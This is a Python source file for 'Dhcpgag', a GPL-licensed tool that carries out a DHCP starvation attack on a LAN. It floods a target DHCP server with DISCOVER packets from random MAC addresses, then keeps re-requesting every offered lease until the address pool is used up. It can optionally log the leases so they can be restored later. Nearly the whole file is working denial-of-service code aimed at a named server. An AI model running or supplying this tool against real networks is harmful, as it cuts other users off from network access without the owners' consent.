#!/usr/bin/env python
"""
    Methods for shutting up a dhcp server on your lan intelligently (and optionally resotre it)
    Copyright (C) 2015  Bram Staps (Glasswall B.V.)

    This file is part of Dhcpgag.

    Dhcpgag is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    Dhcpgag is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with Foobar.  If not, see <http://www.gnu.org/licenses/>.
"""

from multiprocessing import Process
import os
import time
import random
import argparse
import sys
sys.path.append("/usr/lib")
from pktgen import *
sys.path.pop()





########################################################################

def packetRepeater(pkt, t):
    while True:
        sendp(pkt, iface=args.interface, verbose=False)
        time.sleep(t)

def discoverer():
    time.sleep(SNIFF_WAIT)
    burst_counter = burstcount
    while True:
            mac = randomMac()
            print "probing for a place: for [%s]" % mac
            p = mkpktDhcpDiscover(args.dhcpmac, mac)
            sendp(p, iface=args.interface, verbose=False)
            time.sleep([tx,burst_tx][bool(burst_counter)])
            if burst_counter: burst_counter -= 1
                
########################################################################

def dhcpHandler(pkt, repeat=300):
    if pkt.op == 2:
	    options = pkt['DHCP options'].options
	    for x in options:
		try:
		    a,b = x
		    if a == "message-type" and b == 2:
                        sys.stdout.write( "start claiming for: offer from [%s](%s) for ip %s\n" % (pkt.src, pkt["IP"].src, pkt.yiaddr ) )
                        Process(target=packetRepeater, args=(mkpktDhcpRequest(pkt), repeat)).start()

                        if hasHealfile:
                            with open(healfile, "a") as f:
                                f.write("%s\t%s\n" % (pkt.dst, pkt.yiaddr))
                       

		except ValueError:
		    pass
    else:
	    sys.stdout.write( "other dhcp packet\n" )

########################################################################

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="Start hogging all the slots on a DHCP server.")
    parser.add_argument("interface", type=str, help="The interface where to search for DHCP servers.")

    parser.add_argument("dhcpmac", type=str, help="The mac address of the dhcp server to attack")

    parser.add_argument("--burstcount", type=float, help="The amount of packets to burst to fill up the DHCP server before settling to normal speed (Default: 255).")
    parser.add_argument("--burst-tx", type=float, help="The time between packets while bursting (Default: 0.05).")
    parser.add_argument("--tx", type=float, help="The time between packets while after bursting (Default: 5.0).")
    parser.add_argument("--healfile", type=str, help="Place where to store the healing file.")
    args = parser.parse_args()

    burstcount = 255
    if args.burstcount: burstcount = args.burstcount

    burst_tx = 0.05
    if args.burst_tx: burst_tx = args.burst_tx

    tx = 5.0
    if args.tx: burst_tx = args.tx


    hasHealfile = False    
    if args.healfile:
        hasHealfile = True
        healfile = args.healfile

    if hasHealfile:
        try:
            open(healfile, "w")
        except:
            sys.stdout.write("Cannot write healing file.")
            exit(1)

    Process(target=discoverer).start()

    sniff(filter="ether src %s and udp and src port 67 and dst port 68" % args.dhcpmac, prn=dhcpHandler, iface=args.interface)
